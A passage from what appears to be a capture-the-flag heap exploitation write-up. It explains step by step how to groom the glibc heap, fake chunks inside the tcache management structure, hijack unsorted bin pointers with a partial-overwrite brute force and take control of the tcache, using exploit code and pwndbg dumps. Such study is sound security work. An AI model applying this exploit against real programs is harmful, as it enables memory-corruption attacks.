0x55ee5ca96e90	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x55ee5ca96ea0	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x55ee5ca96eb0	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x55ee5ca96ec0	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x55ee5ca96ed0	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x55ee5ca96ee0	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x55ee5ca96ef0	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x55ee5ca96f00	0x3244324432443244	0x0000000000000021	D2D2D2D2!.......
0x55ee5ca96f10	0x0033204452415547	0x0000000000000000	GUARD 3.........
0x55ee5ca96f20	0x0000000000000000	0x000000000001f0e1	................ <-- Top chunk
```

Here, you will notice that the `unsorted bin 0` points to `unsorted bin 1` and vice-versa:
```
0x55ee5ca96a60	0x0000000000000000	0x00000000000001b1	................ <-- unsortedbin[all][1]
0x55ee5ca96a70	0x00007f0638ffed00	0x000055ee5ca96cc0	...8.....l.\.U..

[...]

0x55ee5ca96cc0	0x0000000000000000	0x00000000000001b1	................ <-- unsortedbin[all][0]
0x55ee5ca96cd0	0x000055ee5ca96a60	0x00007f0638ffed00	`j.\.U.....8....
```


Then, fake a `0x20` and a `0x30` chunk by allocating three of the `0x88` chunks that make up the unsorted chunk, such that we still have a pointer pointing to our newly faked chunk:
```python
unsorted2 = malloc(0x1a8, b'2'*0x118+p64(0x31))
unsorted1 = malloc(0x1a8, b'1'*0x118+p64(0x21))
```

It will look like the following:
```
pwndbg> vis 100
[...]

0x55c91b8cba40	0x0000000000000000	0x0000000000000021	........!.......
0x55c91b8cba50	0x0031204452415547	0x0000000000000000	GUARD 1.........
0x55c91b8cba60	0x0000000000000000	0x00000000000001b1	................
0x55c91b8cba70	0x3131313131313131	0x3131313131313131	1111111111111111

[...]

0x55c91b8cbb80	0x3131313131313131	0x0000000000000021	11111111!.......
0x55c91b8cbb90	0x3143314331433143	0x3143314331433143	C1C1C1C1C1C1C1C1

[...]

0x55c91b8cbca0	0x3144314431443144	0x0000000000000021	D1D1D1D1!.......
0x55c91b8cbcb0	0x0032204452415547	0x0000000000000000	GUARD 2.........
0x55c91b8cbcc0	0x0000000000000000	0x00000000000001b1	................
0x55c91b8cbcd0	0x3232323232323232	0x3232323232323232	2222222222222222

[...]

0x55c91b8cbdd0	0x3232323232323232	0x3232323232323232	2222222222222222
0x55c91b8cbde0	0x3232323232323232	0x0000000000000031	222222221.......
0x55c91b8cbdf0	0x3243324332433243	0x3243324332433243	C2C2C2C2C2C2C2C2

[...]

0x55c91b8cbf00	0x3244324432443244	0x0000000000000021	D2D2D2D2!.......
0x55c91b8cbf10	0x0033204452415547	0x0000000000000000	GUARD 3.........
0x55c91b8cbf20	0x0000000000000000	0x000000000001f0e1	................	 <-- Top chunk

pwndbg> telescope &alloc_arr 60
[...]
13:0098│  0x55c91abee0f8 (alloc_arr+152) —▸ 0x55c91b8cbb90 ◂— 0x3143314331433143 ('C1C1C1C1')
[...]
18:00c0│  0x55c91abee120 (alloc_arr+192) —▸ 0x55c91b8cbdf0 ◂— 0x3243324332433243 ('C2C2C2C2')
[...]
... ↓     30 skipped
```

As you can see, `alloc_arr` now contains pointers to the two newly faked `0x20` and `0x30` chunks, which we can then proceed to `free` and index in to the `t-cache`:
```python
free(c1) # 0x21 t-cache entry
free(c2) # 0x31 t-cache entry
free(unsorted2)
free(unsorted1)
```

Now, the heap looks like the following after freeing:
```
0x55692f69ea40	0x0000000000000000	0x0000000000000021	........!.......
0x55692f69ea50	0x0031204452415547	0x0000000000000000	GUARD 1.........
0x55692f69ea60	0x0000000000000000	0x00000000000001b1	................
0x55692f69ea70	0x0000556c79fb1a4e	0x4484565b2543af74	N..ylU..t.C%[V.D <-- tcachebins[0x1b0][0/2]
0x55692f69ea80	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69ea90	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eaa0	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eab0	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eac0	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69ead0	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eae0	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eaf0	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eb00	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eb10	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eb20	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eb30	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eb40	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eb50	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eb60	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eb70	0x3131313131313131	0x3131313131313131	1111111111111111
0x55692f69eb80	0x3131313131313131	0x0000000000000021	11111111!.......
0x55692f69eb90	0x000000055692f69e	0x4484565b2543af74	...V....t.C%[V.D <-- tcachebins[0x20][0/1]
0x55692f69eba0	0x3143314331433143	0x3143314331433143	C1C1C1C1C1C1C1C1

[...]

0x55692f69ecc0	0x0000000000000000	0x00000000000001b1	................
0x55692f69ecd0	0x000000055692f69e	0x4484565b2543af74	...V....t.C%[V.D <-- tcachebins[0x1b0][1/2]
0x55692f69ece0	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69ecf0	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69ed00	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69ed10	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69ed20	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69ed30	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69ed40	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69ed50	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69ed60	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69ed70	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69ed80	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69ed90	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69eda0	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69edb0	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69edc0	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69edd0	0x3232323232323232	0x3232323232323232	2222222222222222
0x55692f69ede0	0x3232323232323232	0x0000000000000031	222222221.......
0x55692f69edf0	0x000000055692f69e	0x4484565b2543af74	...V....t.C%[V.D <-- tcachebins[0x30][0/1]
0x55692f69ee00	0x3243324332433243	0x3243324332433243	C2C2C2C2C2C2C2C2

[...]

0x55692f69ef00	0x3244324432443244	0x0000000000000021	D2D2D2D2!.......
0x55692f69ef10	0x0033204452415547	0x0000000000000000	GUARD 3.........

```

We now have a t-cache entry inside of both unsorted bin entries.

Looking at the `per-thread cache`, our faked `0x10001` chunk is starting to take shape:
```
pwndbg> vis 0
[...]
0x55692f69d070	0x0000000000000000	0x0000000000000000	................
0x55692f69d080	0x0000000000000000	0x0000000000010001	................
0x55692f69d090	0x000055692f69eb90	0x000055692f69edf0	..i/iU....i/iU..
0x55692f69d0a0	0x0000000000000000	0x0000000000000000	................
[...]
```

This now has a `BCK` and a `FWD` pointer to our `unsorted bin` entries and a `size header`.

Now all there is left is just the ability to hijack an `unsorted bin` entry to point to our faked chunk in the `per-thread cache`, which can then be used to gain `arb heap write`. 


Using the same technique, create a second pair of `UAF` pointers for `0xe0` and `0xf0`, which will soon be used to overwrite the `BCK` and `FWD` pointers to our fake `0x10001` `chunk`:
```python
# Malloc from unsorted to reach our desired place to get 0xe1 and 0xf1 written
unsorted1 = malloc(0x1a8, b'1'*mal_size+p64(0xe1))
unsorted2 = malloc(0x1a8, b'2'*mal_size+p64(0xf1))

# exhaust t-cache for later use
for i in tcache_0x1b0:
    free(i)

free(b1) # 0xe1 chunk entry
free(b2) # 0xf1 chunk entry
```

The heap will now look like the following:
```
0x5578453b0a50	0x0031204452415547	0x0000000000000000	GUARD 1.........
0x5578453b0a60	0x0000000000000000	0x00000000000001b1	................

[...]

0x5578453b0af0	0x3131313131313131	0x00000000000000e1	11111111........
0x5578453b0b00	0x00000005578453b0	0xe192c26dfcaee117	.S.W........m... <-- tcachebins[0xe0][0/1]
0x5578453b0b10	0x3131313131313131	0x3131313131313131	1111111111111111
0x5578453b0b20	0x3131313131313131	0x3131313131313131	1111111111111111
0x5578453b0b30	0x3131313131313131	0x3131313131313131	1111111111111111
0x5578453b0b40	0x3131313131313131	0x3131313131313131	1111111111111111
0x5578453b0b50	0x3131313131313131	0x3131313131313131	1111111111111111
0x5578453b0b60	0x3131313131313131	0x3131313131313131	1111111111111111
0x5578453b0b70	0x3131313131313131	0x3131313131313131	1111111111111111
0x5578453b0b80	0x3131313131313131	0x0000000000000021	11111111!.......
0x5578453b0b90	0x00000005578453b0	0xe192c26dfcaee117	.S.W........m... <-- tcachebins[0x20][0/1]

[...]

0x5578453b0ca0	0x3144314431443144	0x0000000000000021	D1D1D1D1!.......
0x5578453b0cb0	0x0032204452415547	0x0000000000000000	GUARD 2.........
0x5578453b0cc0	0x0000000000000000	0x00000000000001b1	................

[...]

0x5578453b0d50	0x3232323232323232	0x00000000000000f1	22222222........
0x5578453b0d60	0x00000005578453b0	0xe192c26dfcaee117	.S.W........m... <-- tcachebins[0xf0][0/1]
0x5578453b0d70	0x3232323232323232	0x3232323232323232	2222222222222222
0x5578453b0d80	0x3232323232323232	0x3232323232323232	2222222222222222
0x5578453b0d90	0x3232323232323232	0x3232323232323232	2222222222222222
0x5578453b0da0	0x3232323232323232	0x3232323232323232	2222222222222222
0x5578453b0db0	0x3232323232323232	0x3232323232323232	2222222222222222
0x5578453b0dc0	0x3232323232323232	0x3232323232323232	2222222222222222
0x5578453b0dd0	0x3232323232323232	0x3232323232323232	2222222222222222
0x5578453b0de0	0x3232323232323232	0x0000000000000031	222222221.......
0x5578453b0df0	0x00000005578453b0	0xe192c26dfcaee117	.S.W........m... <-- tcachebins[0x30][0/1]

[...]

0x5578453b0f00	0x3244324432443244	0x0000000000000021	D2D2D2D2!.......
0x5578453b0f10	0x0033204452415547	0x0000000000000000	GUARD 3.........
0x5578453b0f20	0x0000000000000000	0x000000000001f0e1	................ <-- Top chunk

```

Notice that the two new `UAF` pointers are pointing **above** the `0x20` and `0x30` chunks. This is because the `unsorted bin` is pointing **at** the size header instead of right **under** the size header which is common practice for malloc chunks. 

Now, we can start fitting our two unsorted chunks in to having proper sizes such that our faked `per-thread cache` `chunk` contains valid `FWD` and `BCK` pointers.


Free `unsorted1` again (after just creating a second `fake chunk` with it) and the `d1` chunk allocated in the start to make an even larger unsorted bin. After that, we will carefully use `malloc` to shrink the `unsorted bin` entry such that the top of the unsorted bin is exactly where the `0x20` `t-cache entry` is, effectively creating a pointer to our `unsorted bin`:
```python
#########################################################
#       Fit the unsorted chunks to fit in the UAF       #
#########################################################

# Fit unsorted 1
free(unsorted1)
free(d1)

# Malloc using ONLY chunks not present in any t-cache to make it shrink the unsorted bin entry
malloc(0x38, b'X')
malloc(0x48, b'X')
malloc(0x38, b'X')
malloc(0x58, b'X')
```

The heap memory will now look like the following:
```
pwndbg> vis 90

[...]

0x5636363dba30	0x0000000000000000	0x0000000000000000	................
0x5636363dba40	0x0000000000000000	0x0000000000000021	........!.......
0x5636363dba50	0x0031204452415547	0x0000000000000000	GUARD 1.........
0x5636363dba60	0x0000000000000000	0x0000000000000041	........A.......
0x5636363dba70	0x00007f842effef58	0x00007f842effef30	X.......0.......
0x5636363dba80	0x3131313131313131	0x3131313131313131	1111111111111111
0x5636363dba90	0x3131313131313131	0x3131313131313131	1111111111111111
0x5636363dbaa0	0x3131313131313131	0x0000000000000051	11111111Q.......
0x5636363dbab0	0x00007f842effed58	0x00007f842effed00	X...............
0x5636363dbac0	0x3131313131313131	0x3131313131313131	1111111111111111
0x5636363dbad0	0x3131313131313131	0x3131313131313131	1111111111111111
0x5636363dbae0	0x3131313131313131	0x3131313131313131	1111111111111111
0x5636363dbaf0	0x3131313131313131	0x0000000000000041	11111111A.......
0x5636363dbb00	0x00007f842effed58	0x00007f842effed00	X............... <-- tcachebins[0xe0][0/1]
0x5636363dbb10	0x3131313131313131	0x3131313131313131	1111111111111111
0x5636363dbb20	0x3131313131313131	0x3131313131313131	1111111111111111
0x5636363dbb30	0x3131313131313131	0x0000000000000061	11111111a.......
0x5636363dbb40	0x00007f842effed58	0x00007f842effed00	X...............
0x5636363dbb50	0x3131313131313131	0x3131313131313131	1111111111111111
0x5636363dbb60	0x3131313131313131	0x3131313131313131	1111111111111111
0x5636363dbb70	0x3131313131313131	0x3131313131313131	1111111111111111
0x5636363dbb80	0x3131313131313131	0x0000000000000021	11111111!.......
0x5636363dbb90	0x00000005636363db	0x0000000000000111	.ccc............ <-- tcachebins[0x20][0/1], unsortedbin[all][0]
0x5636363dbba0	0x00007f842effed00	0x00007f842effed00	................
0x5636363dbbb0	0x3143314331433143	0x3143314331433143	C1C1C1C1C1C1C1C1
0x5636363dbbc0	0x3143314331433143	0x3143314331433143	C1C1C1C1C1C1C1C1
0x5636363dbbd0	0x3143314331433143	0x3143314331433143	C1C1C1C1C1C1C1C1
```

Now allocate the remaining data of the `unsorted bin` such that we can create a similar setup for `unsorted2` without it first attempting to empty `unsorted1` or even worse, sorts the `unsorted bin`.

After allocating the remainder of `unsorted1`, we do the same for `unsorted2`:
```python
# Allocate the rest of unsorted1 such that it does not get sorted when working with unsorted2
unsorted_f1 = malloc(0x108, b'Y'*mal_size)

# Fit unsorted 2
free(unsorted2)
free(d2)

# Same as above
malloc(0x38, b'X')
malloc(0x48, b'X')
malloc(0x38, b'X')
malloc(0x58, b'X')

# Same as above
unsorted_f2 = malloc(0x108, b'Z'*mal_size)
```

Finally, allocate a third `chunk` of size `0x108` which will be hijacked for later:
```python
# This will be hijacked
unsorted_f3 = malloc(0x108, b'X'*mal_size) 
```

With this ready, we will now exhaust the `0x108` `t-cache` such that when we free `unsorted_f1`, `unsorted_f2` and `unsorted_f3` they will go to the `unsorted bin` instead of the `0x110 t-cache`:
```python
#################################################################
#               Exhaust the 0x110 t-cache bin                   #
#################################################################
tcache_0x110 = []
for i in range(8):
    tcache_0x110.append(malloc(0x108, b'^'*0x108))
for i in tcache_0x110:
    free(i)
```


Now almost all of the preparations are done. 
Thinking back to "the plan", one of the requirements from the `try_free` command was that our `fake chunk+0x10000` had to be == `0x10000`, with a chunk in front of it.

So let's do that:
```python
#################################################################################
#   Make the entry in the mgmt chunk a valid chunk by making the size 0x10000   #
#   and making a valid size next to it with prev_in_use set to 0                #
#################################################################################

for i in range(36):
    malloc(0x5f8, b'Z'*0x5f8)
malloc(0x5f8, b'A'*0xd0+p64(0x10000)+p64(0x20))
```

Now, if we look at our `fake chunk` in gdb, we see that it contains the correct values needed for a fake `unsorted bin` entry:
```
pwndbg> vis 0

0x55c990a81000	0x0000000000000000	0x0000000000000291	................
0x55c990a81010	0x0000000000010001	0x0007000000000000	................
0x55c990a81020	0x0000000000000000	0x0007000000010001	................
0x55c990a81030	0x0000000000000000	0x0000000000000000	................
0x55c990a81040	0x0000000000070000	0x0000000000000000	................
0x55c990a81050	0x0000000000000000	0x0000000000000000	................
0x55c990a81060	0x0000000000000000	0x0000000000000000	................
0x55c990a81070	0x0000000000000000	0x0000000000000000	................
0x55c990a81080	0x0000000000000000	0x0000000000010001	................
0x55c990a81090	0x000055c990a82b90	0x000055c990a82df0	.+...U...-...U..
0x55c990a810a0	0x0000000000000000	0x0000000000000000	................
0x55c990a810b0	0x0000000000000000	0x0000000000000000	................

[...]

pwndbg> dq 0x55c990a81080+0x10000
000055c990a91080     0000000000010000 0000000000000020
000055c990a91090     0000000000000000 0000000000000000
000055c990a910a0     0000000000000000 0000000000000000

```

Finally, let's create our `unsorted bin list`:
```python
###############
# Free chunks #
###############

free(unsorted_f1) # Start of unsorted bin

free(unsorted_f3) # This will be hijacked for later

free(unsorted_f2) # End of unsorted bin
```

And now, our heap layout will look like the following:
```
pwndbg> vis 100

[...]

0x560836be6af0	0x3131313131313131	0x0000000000000041	11111111A.......
0x560836be6b00	0x00007f386c3fed58	0x00007f386c3fed00	X.?l8.....?l8... <-- tcachebins[0xe0][0/1]
0x560836be6b10	0x3131313131313131	0x3131313131313131	1111111111111111
0x560836be6b20	0x3131313131313131	0x3131313131313131	1111111111111111
0x560836be6b30	0x3131313131313131	0x0000000000000061	11111111a.......
0x560836be6b40	0x00007f386c3fed58	0x00007f386c3fed00	X.?l8.....?l8...
0x560836be6b50	0x3131313131313131	0x3131313131313131	1111111111111111
0x560836be6b60	0x3131313131313131	0x3131313131313131	1111111111111111
0x560836be6b70	0x3131313131313131	0x3131313131313131	1111111111111111
0x560836be6b80	0x3131313131313131	0x0000000000000021	11111111!.......
0x560836be6b90	0x0000000560836be6	0x0000000000000111	.k.`............ <-- tcachebins[0x20][0/1], unsortedbin[all][2]
0x560836be6ba0	0x00007f386c3fed00	0x0000560836be6f20	..?l8... o.6.V..
0x560836be6bb0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x560836be6bc0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x560836be6bd0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x560836be6be0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x560836be6bf0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x560836be6c00	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x560836be6c10	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
0x560836be6c20	0x5959595959595959	0x3144314431443144	YYYYYYYYD1D1D1D1
0x560836be6c30	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x560836be6c40	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x560836be6c50	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x560836be6c60	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x560836be6c70	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x560836be6c80	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x560836be6c90	0x3144314431443144	0x3144314431443144	D1D1D1D1D1D1D1D1
0x560836be6ca0	0x0000000000000110	0x0000000000000020	........ .......
0x560836be6cb0	0x0032204452415547	0x0000000000000000	GUARD 2.........
0x560836be6cc0	0x0000000000000000	0x0000000000000041	........A.......
0x560836be6cd0	0x00007f386c3fef58	0x00007f386c3fef30	X.?l8...0.?l8...
0x560836be6ce0	0x3232323232323232	0x3232323232323232	2222222222222222
0x560836be6cf0	0x3232323232323232	0x3232323232323232	2222222222222222
0x560836be6d00	0x3232323232323232	0x0000000000000051	22222222Q.......
0x560836be6d10	0x00007f386c3fed58	0x00007f386c3fed00	X.?l8.....?l8...
0x560836be6d20	0x3232323232323232	0x3232323232323232	2222222222222222
0x560836be6d30	0x3232323232323232	0x3232323232323232	2222222222222222
0x560836be6d40	0x3232323232323232	0x3232323232323232	2222222222222222
0x560836be6d50	0x3232323232323232	0x0000000000000041	22222222A.......
0x560836be6d60	0x00007f386c3fed58	0x00007f386c3fed00	X.?l8.....?l8... <-- tcachebins[0xf0][0/1]
0x560836be6d70	0x3232323232323232	0x3232323232323232	2222222222222222
0x560836be6d80	0x3232323232323232	0x3232323232323232	2222222222222222
0x560836be6d90	0x3232323232323232	0x0000000000000061	22222222a.......
0x560836be6da0	0x00007f386c3fed58	0x00007f386c3fed00	X.?l8.....?l8...
0x560836be6db0	0x3232323232323232	0x3232323232323232	2222222222222222
0x560836be6dc0	0x3232323232323232	0x3232323232323232	2222222222222222
0x560836be6dd0	0x3232323232323232	0x3232323232323232	2222222222222222
0x560836be6de0	0x3232323232323232	0x0000000000000031	222222221.......
0x560836be6df0	0x0000000560836be6	0x0000000000000111	.k.`............ <-- tcachebins[0x30][0/1], unsortedbin[all][0]
0x560836be6e00	0x0000560836be6f20	0x00007f386c3fed00	 o.6.V....?l8...
0x560836be6e10	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a	ZZZZZZZZZZZZZZZZ
0x560836be6e20	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a	ZZZZZZZZZZZZZZZZ
0x560836be6e30	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a	ZZZZZZZZZZZZZZZZ
0x560836be6e40	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a	ZZZZZZZZZZZZZZZZ
0x560836be6e50	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a	ZZZZZZZZZZZZZZZZ
0x560836be6e60	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a	ZZZZZZZZZZZZZZZZ
0x560836be6e70	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a	ZZZZZZZZZZZZZZZZ
0x560836be6e80	0x5a5a5a5a5a5a5a5a	0x3244324432443244	ZZZZZZZZD2D2D2D2
0x560836be6e90	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x560836be6ea0	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x560836be6eb0	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x560836be6ec0	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x560836be6ed0	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x560836be6ee0	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x560836be6ef0	0x3244324432443244	0x3244324432443244	D2D2D2D2D2D2D2D2
0x560836be6f00	0x0000000000000110	0x0000000000000020	........ .......
0x560836be6f10	0x0033204452415547	0x0000000000000000	GUARD 3.........
0x560836be6f20	0x0000000000000000	0x0000000000000111	................ <-- unsortedbin[all][1]
0x560836be6f30	0x0000560836be6b90	0x0000560836be6df0	.k.6.V...m.6.V..
0x560836be6f40	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x560836be6f50	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x560836be6f60	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x560836be6f70	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x560836be6f80	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x560836be6f90	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x560836be6fa0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
0x560836be6fb0	0x5858585858585858	0x0000000000000000	XXXXXXXX........
0x560836be6fc0	0x0000000000000000	0x0000000000000000	................
0x560836be6fd0	0x0000000000000000	0x0000000000000000	................
0x560836be6fe0	0x0000000000000000	0x0000000000000000	................
0x560836be6ff0	0x0000000000000000	0x0000000000000000	................
0x560836be7000	0x0000000000000000	0x0000000000000000	................
0x560836be7010	0x0000000000000000	0x0000000000000000	................
0x560836be7020	0x0000000000000000	0x0000000000000000	................
0x560836be7030	0x0000000000000110	0x0000000000000110	................

[...]

pwndbg> bins

[...]

unsortedbin
all: 0x560836be6df0 —▸ 0x560836be6f20 —▸ 0x560836be6b90 —▸ 0x7f386c3fed00 ◂— 0x560836be6df0
smallbins
empty
largebins
empty


pwndbg> vis 0

0x560836be5000	0x0000000000000000	0x0000000000000291	................
0x560836be5010	0x0000000000010001	0x0007000000000000	................
0x560836be5020	0x0000000000000000	0x0007000000010001	................
0x560836be5030	0x0000000000000000	0x0000000000000000	................
0x560836be5040	0x0000000000070000	0x0000000000000000	................
0x560836be5050	0x0000000000000000	0x0000000000000000	................
0x560836be5060	0x0000000000000000	0x0000000000000000	................
0x560836be5070	0x0000000000000000	0x0000000000000000	................
0x560836be5080	0x0000000000000000	0x0000000000010001	................
0x560836be5090	0x0000560836be6b90	0x0000560836be6df0	.k.6.V...m.6.V..

[...]

pwndbg> tel 0x560836be5080
00:0000│  0x560836be5080 ◂— 0x0
01:0008│  0x560836be5088 ◂— 0x10001
02:0010│  0x560836be5090 —▸ 0x560836be6b90 ◂— 0x560836be6
03:0018│  0x560836be5098 —▸ 0x560836be6df0 ◂— 0x560836be6
04:0020│  0x560836be50a0 ◂— 0x0
... ↓     3 skipped

```

We now have a list of `unsorted bins`. We have two pointers in the `per-thread cache` pointing to the `unsorted bin 1` and `unsorted bin 2` entries. Our `0x10000` `cunk` in `per-thread cache` fulfills the requirements needed for a chunk and we can edit the meta-data for our unsorted bins via the `0xe0` and `0xf0` `t-cache entries`.

We are now finally ready to hijack an `unsorted bin entry`.

Using the following, we can bruteforce 4 bits of the heap, overwriting the `LSB` of the `FWD` and `BCK` pointer of the two unsorted bin entries. This will be used to make it point to our faked chunk in the `per-thread cache`:
```python
#############################################################################################
# Change the FWD and BCK pointers of the unsorted bin entires to our faked chunk in mgmt    #
#############################################################################################

malloc(0xd8, p16(0x6080), 0xa8) # BCK
malloc(0xe8, p16(0x6080), 0xa0) # FWD 
```

After running it a few times, you will eventually reach the correct heap address, making our heap look like the following:
```
pwndbg> bins

[...]

unsortedbin
all: 0x56542aec7df0 —▸ 0x56542aec6080 —▸ 0x56542aec7b90 —▸ 0x7fa2065fed00 ◂— 0x56542aec7df0
smallbins
empty
largebins
empty
pwndbg> vis 0

0x56542aec6000	0x0000000000000000	0x0000000000000291	................
0x56542aec6010	0x0000000000010001	0x0007000000000000	................
0x56542aec6020	0x0000000000000000	0x0007000000000000	................
0x56542aec6030	0x0000000000000000	0x0000000000000000	................
0x56542aec6040	0x0000000000070000	0x0000000000000000	................
0x56542aec6050	0x0000000000000000	0x0000000000000000	................
0x56542aec6060	0x0000000000000000	0x0000000000000000	................
0x56542aec6070	0x0000000000000000	0x0000000000000000	................
0x56542aec6080	0x0000000000000000	0x0000000000010001	................	 <-- unsortedbin[all][1]
0x56542aec6090	0x000056542aec7b90	0x000056542aec7df0	.{.*TV...}.*TV..
0x56542aec60a0	0x0000000000000000	0x0000000000000000	................
0x56542aec60b0	0x0000000000000000	0x0000000000000000	................
0x56542aec60c0	0x0000000000000000	0x000056542aec6620	........ f.*TV..
0x56542aec60d0	0x0000000000000000	0x0000000000000000	................
0x56542aec60e0	0x0000000000000000	0x0000000000000000	................
0x56542aec60f0	0x00007fa7631d439f	0x00007fa7631d439f	.C.c.....C.c....
0x56542aec6100	0x0000000000000000	0x000056542aec86a0	...........*TV..
0x56542aec6110	0x0000000000000000	0x0000000000000000	................
0x56542aec6120	0x0000000000000000	0x0000000000000000	................
0x56542aec6130	0x0000000000000000	0x0000000000000000	................
0x56542aec6140	0x0000000000000000	0x0000000000000000	................
0x56542aec6150	0x0000000000000000	0x000056542aec70d0	.........p.*TV..
0x56542aec6160	0x0000000000000000	0x0000000000000000	................
0x56542aec6170	0x0000000000000000	0x0000000000000000	................
0x56542aec6180	0x0000000000000000	0x0000000000000000	................
0x56542aec6190	0x0000000000000000	0x0000000000000000	................
0x56542aec61a0	0x0000000000000000	0x0000000000000000	................
0x56542aec61b0	0x0000000000000000	0x0000000000000000	................
0x56542aec61c0	0x0000000000000000	0x0000000000000000	................
0x56542aec61d0	0x0000000000000000	0x0000000000000000	................
0x56542aec61e0	0x0000000000000000	0x0000000000000000	................
0x56542aec61f0	0x0000000000000000	0x0000000000000000	................
0x56542aec6200	0x0000000000000000	0x0000000000000000	................
0x56542aec6210	0x0000000000000000	0x0000000000000000	................
0x56542aec6220	0x0000000000000000	0x0000000000000000	................
0x56542aec6230	0x0000000000000000	0x0000000000000000	................
0x56542aec6240	0x0000000000000000	0x0000000000000000	................
0x56542aec6250	0x0000000000000000	0x0000000000000000	................
0x56542aec6260	0x0000000000000000	0x0000000000000000	................
0x56542aec6270	0x000056542aec7280	0x000056542aec7660	.r.*TV..`v.*TV..
0x56542aec6280	0x0000000000000000	0x0000000000000000	................
0x56542aec6290	0x0000000000000000

```

From here, we can simply make a new allocation which will be taken from the faked `0x10000` `unsorted bin` to overwrite the `LSB` of our `0x3d8` t-cache chunk. Doing so we can make it point to the top of the `per-thread cache`, and then make an allocation on top of the `per-thread cache`, wiping the `t-cache`:
```python
#########################################################################################
# Alloc in to mgmt chunk to overwrite LSB of 0x3d8 t-cache entry to control mgmt fully! #
#########################################################################################

# Overwrite LSB of 0x3d8
malloc(0x248, p16(0x6010), 0x1e0)

# Allocate at the management chunk!
mgmt = malloc(0x3d8, p8(0)*0x288)

```

Here, `mgmt` is the chunk, which is on top of the `per-thread cache`.

This will make the `heap` look like the following after the "cleaning":
```
pwndbg> vis 0

0x55ea57266000	0x0000000000000000	0x0000000000000291	................
0x55ea57266010	0x0000000000000000	0x0000000000000000	................
0x55ea57266020	0x0000000000000000	0x0000000000000000	................
0x55ea57266030	0x0000000000000000	0x0000000000000000	................
0x55ea57266040	0x0000000000000000	0x0000000000000000	................
0x55ea57266050	0x0000000000000000	0x0000000000000000	................
0x55ea57266060	0x0000000000000000	0x0000000000000000	................
0x55ea57266070	0x0000000000000000	0x0000000000000000	................
0x55ea57266080	0x0000000000000000	0x0000000000000000	................
0x55ea57266090	0x0000000000000000	0x0000000000000000	................
0x55ea572660a0	0x0000000000000000	0x0000000000000000	................
